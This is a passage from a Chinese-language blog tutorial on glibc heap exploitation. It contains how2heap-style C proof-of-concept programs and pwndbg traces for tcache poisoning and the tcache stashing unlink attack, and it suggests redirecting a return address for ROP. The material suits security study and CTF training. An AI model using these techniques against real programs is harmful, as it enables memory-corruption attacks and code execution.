hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个malloc然后两个free之后,两个堆块就放到tcache中了</p>
<p>如果没有tcache,这俩都应该放在fastbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x8403000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x8403250</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x84032e0</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x8403260</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x8403370</span><br><span class="line">Size: 0x20c91</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tcache</span><br><span class="line">&#123;</span><br><span class="line">  counts = <span class="string">&quot;\000\000\000\000\000\000\000\002&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">55</span> times&gt;,</span><br><span class="line">  entries = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x84032f0</span>, <span class="number">0x0</span> &lt;repeats <span class="number">56</span> times&gt;&#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; tcachebin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x84032f0</span> —▸ <span class="number">0x8403260</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcachebin[idx]&quot;]----&gt;b[&quot;b@0x84032f0&quot;]----&gt;a[&quot;a@0x8403260&quot;]----&gt;null</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时b[0]就是其指向a的next指针,直接修改b[0]就可以玩坏tcache</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tcachebins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x84032f0</span> —▸ <span class="number">0x7ffffffedde8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>



<p>这就把栈上的<code>stack_var@0x0x7ffffffedde8</code>连接到tcache上了</p>
<p>下一次分配会拿走b</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcachebin[idx]&quot;]----&gt;stack_var[&quot;stack_var@0x0x7ffffffedde8&quot;]----&gt;null</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再下一次分配c就会拿走stack_var</p>
<p>也就是说c指向<code>0x0x7ffffffedde8</code>这个地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">1</span> = (<span class="type">intptr_t</span> *) <span class="number">0x7ffffffedde8</span></span><br></pre></td></tr></table></figure>

<p>如果我们把<code>b[0] = (intptr_t)&amp;stack_var;</code></p>
<p>改成<code>b[0] = (intptr_t)&amp;rip;</code>也就是篡改了函数返回地址</p>
<p>然后就可以通过<code>c[0]=&amp;vuln_func</code>进行ROP攻击</p>
<h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先顺序分配9个堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后把[3,8]这六个放到tcache中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后将1放到tcache中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p>此时tcache中的结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcache[idx]&quot;]----&gt;1----&gt;8----&gt;7----&gt;6----&gt;5----&gt;4----&gt;3</span><br></pre></td></tr></table></figure>

<p>然后将0和2先后放到unsortedbin上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">	unsortedbin&lt;----&gt;2&lt;----&gt;1</span><br></pre></td></tr></table></figure>

<p>然后分配一个0xa0大小的堆块,显然所有0x90的堆块都不合适,需要到topchunk上切割新的,但是对这个0xa0的分配过程中,会让unsortedbin中的堆块分类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">smallbin[&quot;smallbin[idx]&quot;]&lt;----&gt;1&lt;----&gt;2</span><br></pre></td></tr></table></figure>

<p>然后分配两个0x90,这次命中tcache</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcache[idx]&quot;]----&gt;5----&gt;4----&gt;3</span><br></pre></td></tr></table></figure>

<p>然后篡改位于smallbin中的2号堆块的bk指针,改成stack_var的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_lis[2][1] = (unsigned long)stack_var;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">smallbin[&quot;smallbin[idx]&quot;]&lt;----&gt;1&lt;----&gt;2----&gt;stack_var</span><br></pre></td></tr></table></figure>

<p>然后calloc(1,0x90)会绕过lib_malloc,直接调用int_malloc,这就绕过了tcache分配,使用smallbin分配,把1号堆块从smallbin上卸下来,然后将2和伪造的stack_var假堆块放到tcache中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcache[idx]&quot;]----&gt;stack_var----&gt;2----&gt;5----&gt;4----&gt;3</span><br></pre></td></tr></table></figure>

<p>此时再分配<code> target = malloc(0x90);</code>就是在libc_malloc中使用tcache进行分配</p>
<p>target拿到的就是一个栈地址了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;stack_var</span><br><span class="line">$<span class="number">3</span> = (<span class="type">unsigned</span> <span class="type">long</span> (*)[<span class="number">16</span>]) <span class="number">0x7fffffffd2e0</span></span><br><span class="line">pwndbg&gt; p target</span><br><span class="line">$<span class="number">4</span> = (<span class="type">unsigned</span> <span class="type">long</span> *) <span class="number">0x7fffffffd2f0</span></span><br></pre></td></tr></table></figure>
















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><a class="page-number" href="/impossible/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/impossible/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/11/">11</a><a class="extend next" rel="next" href="/impossible/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
